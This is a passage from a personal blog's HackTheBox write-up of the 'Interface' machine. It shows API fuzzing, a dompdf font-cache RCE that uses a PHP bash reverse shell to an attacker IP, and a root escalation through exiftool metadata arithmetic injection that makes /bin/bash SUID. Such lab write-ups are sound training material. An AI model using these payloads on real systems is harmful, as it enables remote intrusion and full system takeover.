</pre></table></code></div></div><p>All of these have no place or means to exploit to this web application, I will stop here and go back to <code class="language-plaintext highlighter-rouge">api</code> and testing it but if there is no interesting details then i will return to <code class="language-plaintext highlighter-rouge">vendor</code> with <code class="language-plaintext highlighter-rouge">dom2pdf</code>.</p><p><strong>Request</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
└─$ curl -i http://prd.m.rendering-api.interface.htb/api           
HTTP/1.1 404 Not Found
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 30 Mar 2023 19:08:40 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive

{"status":"404","status_text":"route not defined"}
</pre></table></code></div></div><p>The response is pretty clear with status code <code class="language-plaintext highlighter-rouge">404</code> with a message that <code class="language-plaintext highlighter-rouge">route not defined</code> this means that the fuzzer was unable to find any endpoints or routes in the target API that it could use to send request then more enumeration is required until to find the valid endpoint.</p><p><strong>Command</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
└─$ ffuf -u http://prd.m.rendering-api.interface.htb/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 -mc all -ic -c -fs 50 -X POST
</pre></table></code></div></div><p><strong>Result</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://prd.m.rendering-api.interface.htb/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: all
 :: Filter           : Response size: 50
________________________________________________

html2pdf                [Status: 422, Size: 36, Words: 2, Lines: 1]
:: Progress: [30000/30000] :: Job [1/1] :: 491 req/sec :: Duration: [0:01:01] :: Errors: 2 ::
</pre></table></code></div></div><p>Tried to fuzz <code class="language-plaintext highlighter-rouge">api</code> with <code class="language-plaintext highlighter-rouge">GET</code> method but it end up with <code class="language-plaintext highlighter-rouge">502</code> code but after changing it to <code class="language-plaintext highlighter-rouge">POST</code> result was promising as shown above that there is another endpoint <code class="language-plaintext highlighter-rouge">html2pdf</code> which i can now access it</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
└─$ curl -i http://prd.m.rendering-api.interface.htb/api/html2pdf
HTTP/1.1 404 Not Found
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 30 Mar 2023 19:45:17 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive

{"status":"404","status_text":"route not defined"} 
</pre></table></code></div></div><p>I used the <code class="language-plaintext highlighter-rouge">curl</code> command without specifying the requesting method which by default will be <code class="language-plaintext highlighter-rouge">GET</code> and it keep saying <code class="language-plaintext highlighter-rouge">route not defined</code> . So now i will change the method to <code class="language-plaintext highlighter-rouge">POST</code> and see the result if it is different.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
└─$ curl -i http://prd.m.rendering-api.interface.htb/api/html2pdf -X POST
HTTP/1.1 422 Unprocessable Entity
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 30 Mar 2023 19:45:24 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive

{"status_text":"missing parameters"} 
</pre></table></code></div></div><p>Result now is different and claims that some parameters are missed then now another enumeration is required to know which parameters are missed.</p><h3 id="more-enumeration">More Enumeration</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/interface/exploit/dompdf-rce/exploit]
└─$ ffuf -u http://prd.m.rendering-api.interface.htb/api/html2pdf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 -mc all -ic -c -fs 50,36  -d '{"FUZZ":"FUZZ"}' -H "Content-Type: application/json"
</pre></table></code></div></div><p><strong>Result</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://prd.m.rendering-api.interface.htb/api/html2pdf
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"FUZZ":"FUZZ"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: all
 :: Filter           : Response size: 50,36
________________________________________________

html                    [Status: 200, Size: 1130, Words: 116, Lines: 77]
:: Progress: [30000/30000] :: Job [1/1] :: 500 req/sec :: Duration: [0:01:00] :: Errors: 0 ::
</pre></table></code></div></div><p>The result is <code class="language-plaintext highlighter-rouge">html</code> then i can test to request with added <code class="language-plaintext highlighter-rouge">html</code> parameter.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/interface/04.png" alt="image" /></p><h2 id="shell-as-www-data">Shell as www-data</h2><p>After much enumeration and fuzzing i found the required parameters as i have shown above and to exploit this web application there is <a href="https://www.mend.io/vulnerability-database/CVE-2022-28368">CVE-2022-28368</a> but the original post is from <a href="https://positive.security/blog/dompdf-rce">positive.security</a> to understand more with simple words check also <a href="https://snyk.io/blog/security-alert-php-pdf-library-dompdf-rce/">snyk</a> blog post.</p><p>In summary this exploit is done by application allows <code class="language-plaintext highlighter-rouge">php</code> execution during <code class="language-plaintext highlighter-rouge">pdf</code> rendering, also with this functionality is that it will format the <code class="language-plaintext highlighter-rouge">pdf</code> output using straight <code class="language-plaintext highlighter-rouge">html</code> tags. In exploitation i used this <a href="https://github.com/positive-security/dompdf-rce">POC</a> from <a href="https://positive.security/blog/dompdf-rce">positive.security</a> and below are some few steps to exploit it.</p><p><strong>Step 01</strong></p><p>Change <code class="language-plaintext highlighter-rouge">exploit.css</code> and add your <code class="language-plaintext highlighter-rouge">ip</code> as it i placed mine</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>@font-face {
    font-family:'exploitfont';
    src:url('http://10.10.14.94/exploit_font.php');
    font-weight:'normal';
    font-style:'normal';
  }
</pre></table></code></div></div><p><strong>Step 02</strong></p><p>Change the <code class="language-plaintext highlighter-rouge">exploit_font.php</code> and the following line at the very bottom of the file and do not forget to replace the <code class="language-plaintext highlighter-rouge">ip</code> and <code class="language-plaintext highlighter-rouge">port</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>&lt;?php exec("/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.94/1234 0&gt;&amp;1'"); ?&gt;
</pre></table></code></div></div><p><strong>Step 03</strong></p><p>Start <code class="language-plaintext highlighter-rouge">python</code> server to make sure that the file is being sent to the server and delivered successfully.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/interface/exploit/dompdf-rce/exploit]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</pre></table></code></div></div><p><strong>Step 04</strong></p><p>Send the file with as parameter.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/interface/05.png" alt="image" /></p><p><strong>Step 05</strong></p><p>Check for the response</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/interface/exploit/dompdf-rce/exploit]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.200 - - [31/Mar/2023 00:00:39] "GET /exploit.css HTTP/1.0" 200 -
10.10.11.200 - - [31/Mar/2023 00:00:39] "GET /exploit_font.php HTTP/1.0" 200 -
</pre></table></code></div></div><p><strong>Step 06</strong></p><p>According <a href="https://positive.security/blog/dompdf-rce">positive.security</a> blog post says wen an external font is used, <code class="language-plaintext highlighter-rouge">dompdf</code> caches it locally in the <code class="language-plaintext highlighter-rouge">/lib/fonts</code> sub-directory and adds a corresponding entry in <code class="language-plaintext highlighter-rouge">dompdf_font_family_cache.php</code>. Also the in the blog post there is a code snippet which shows that the file will be stored with its name but is <code class="language-plaintext highlighter-rouge">md5</code> hash will be appended at the end of the file name before its extension example if the file is <code class="language-plaintext highlighter-rouge">hashghost_font.php</code> then it will be stored as <code class="language-plaintext highlighter-rouge">hashghostfont_normal_md5hash.php</code></p><p><strong>Step 07</strong></p><p>Create <code class="language-plaintext highlighter-rouge">md5</code> hash of the file <code class="language-plaintext highlighter-rouge">exploit_font.php</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
└─$ echo -n http://10.10.14.94/exploit_font.php | md5sum
1a3cd1e49f9b715e8e533407fa8b1caa  -
</pre></table></code></div></div><p><strong>Step 08</strong></p><p>Start a listener</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
└─$ nc -nlvp 1234
</pre></table></code></div></div><p><strong>Step 09</strong></p><p>Send the request now</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/interface/07.png" alt="image" /></p><p><strong>Step 10</strong></p><p>Response in <code class="language-plaintext highlighter-rouge">netcat</code> listener</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
└─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.94] from (UNKNOWN) [10.10.11.200] 33382
bash: cannot set terminal process group (1159): Inappropriate ioctl for device
bash: no job control in this shell
www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ 
</pre></table></code></div></div><h2 id="user">User</h2><p>With user <code class="language-plaintext highlighter-rouge">www-data</code> i was able to read flag of user <code class="language-plaintext highlighter-rouge">dev</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>www-data@interface:/home/dev$ cat user.txt 
415feaa963*******************
</pre></table></code></div></div><h2 id="root">Root</h2><p>I uploaded <a href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64">pspy64</a> and found that there is a clean up script running by user <code class="language-plaintext highlighter-rouge">root</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>2023/03/30 22:26:01 CMD: UID=0     PID=2784   | /bin/bash /usr/local/sbin/cleancache.sh 
2023/03/30 22:26:01 CMD: UID=0     PID=2783   | /bin/sh -c /usr/local/sbin/cleancache.sh 
2023/03/30 22:26:01 CMD: UID=0     PID=2782   | /usr/sbin/CRON -f 
</pre></table></code></div></div><p>Reading this file</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>www-data@interface:/dev/shm$ cat /usr/local/sbin/cleancache.sh 
</pre></table></code></div></div><p><strong>Result</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>#! /bin/bash
cache_directory="/tmp"
for cfile in "$cache_directory"/*; do

    if [[ -f "$cfile" ]]; then

        meta_producer=$(/usr/bin/exiftool -s -s -s -Producer "$cfile" 2&gt;/dev/null | cut -d " " -f1)

        if [[ "$meta_producer" -eq "dompdf" ]]; then
            echo "Removing $cfile"
            rm "$cfile"
        fi

    fi

done
</pre></table></code></div></div><p>This script iterates over files in the <code class="language-plaintext highlighter-rouge">/tmp</code> directory and checks if they are files (<code class="language-plaintext highlighter-rouge">-f</code> option). If a file is found, it uses the <code class="language-plaintext highlighter-rouge">exiftool</code> command to extract the metadata producer information from the file. If the producer is <code class="language-plaintext highlighter-rouge">dompdf</code>, the script deletes the file using the <code class="language-plaintext highlighter-rouge">rm</code> command.</p><p>This line is vulnerable to <a href="https://research.nccgroup.com/2020/05/12/shell-arithmetic-expansion-and-evaluation-abuse/">arithmetic injection</a></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>meta_producer=$(/usr/bin/exiftool -s -s -s -Producer "$cfile" 2&gt;/dev/null | cut -d " " -f1)   
</pre></table></code></div></div><p>I will use as reference</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>`# VARIABLE='arr[$(uname -n -s -m -o)]' ./arithmetic.sh  
arr[$(uname -n -s -m -o)]
</pre></table></code></div></div><p>Instead of running command as above i will create a file which executes a <code class="language-plaintext highlighter-rouge">suid</code> binary of <code class="language-plaintext highlighter-rouge">bash</code> and name it as <code class="language-plaintext highlighter-rouge">hash.sh</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>www-data@interface:~$ cat &gt; hash.sh &lt;&lt;EOF                                                                                                                            
&gt; #!/bin/bash                                                                                                                                                        
&gt; chmod u+s /bin/bash                                                                                                                                                
&gt; EOF
&gt; www-data@interface:~$
</pre></table></code></div></div><p>Now i will create a file in <code class="language-plaintext highlighter-rouge">/tmp</code> directory because the cleaning script cleans files that are in <code class="language-plaintext highlighter-rouge">/tmp</code> also i will add metadata by using <code class="language-plaintext highlighter-rouge">exiftool</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>www-data@interface:~$ exiftool -Producer='a[$(hash.sh&gt;&amp;2)]+42'
www-data@interface:~$ touch /tmp/lol
www-data@interface:~$ exiftool -Producer='a[$(hash.sh&gt;&amp;2)]+42' /tmp/lol
    1 image files updated
www-data@interface:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr 18  2022 /bin/bash
www-data@interface:~$ bash -p

bash-4.4# cat /root/root.txt
f64108af50*****************
</pre></table></code></div></div><p>The End.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Mungu Nisaidie
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/htb-linux/'>HTB-Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/machines/" class="post-tag no-text-decoration" >Machines</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1"></span> <span class="share-icons"> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/password_cracking/">PASSWORD_CRACKING</a> <a class="post-tag" href="/tags/ad/">AD</a> <a class="post-tag" href="/tags/sqli/">SQLi</a> <a class="post-tag" href="/tags/xxe/">XXE</a> <a class="post-tag" href="/tags/blue-teaming/">Blue Teaming</a> <a class="post-tag" href="/tags/machines/">Machines</a> <a class="post-tag" href="/tags/linux/">Linux</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/health/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Jan 11 <i class="unloaded">2023-01-11T14:49:38+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Health</h3><div class="text-muted small"><p> Enumeration Nmap Scan # Nmap 7.93 scan initiated Wed Jan 11 12:05:23 2023 as: nmap -sC -sV -oN nmap-scan 10.10.11.176 Host is up (0.18s latency). Scanned at 2023-01-11 12:05:26 EAT for 74s Not show...</p></div></div></a></div><div class="card"> <a href="/photobomb/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Feb 11 <i class="unloaded">2023-02-11T18:30:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Photobomb</h3><div class="text-muted small"><p> This is hackthebox easy rated machine designed to show the command injection for the user access and path injection knowledge for the root user. In this box i will show different ways of how to be ...</p></div></div></a></div><div class="card"> <a href="/noter/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Oct 5, 2022 <i class="unloaded">2022-10-05T18:49:38+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Noter</h3><div class="text-muted small"><p> Enumeration. Nmap Scan. Command nmap -sC -sV -oN nmap-scan 10.10.11.160 Result # Nmap 7.92 scan initiated Tue Sep 6 08:54:37 2022 as: nmap -sC -sV -oN nmap-scan 10.10.11.160 Nmap scan report for ...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/optimum/" class="btn btn-outline-primary"><p>Optimum</p></a> <span class="btn btn-outline-primary disabled"><p>-</p></span></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT License --></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/hashghost21">Julius Soraely</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span> <script src="https://www.hackthebox.com/badge/990235"></script></p></div><div class="footer-right"><p class="mb-0"><h4>H4cking is Fun</h4></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/password_cracking/">PASSWORD_CRACKING</a> <a class="post-tag" href="/tags/ad/">AD</a> <a class="post-tag" href="/tags/sqli/">SQLi</a> <a class="post-tag" href="/tags/xxe/">XXE</a> <a class="post-tag" href="/tags/blue-teaming/">Blue Teaming</a> <a class="post-tag" href="/tags/machines/">Machines</a> <a class="post-tag" href="/tags/linux/">Linux</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
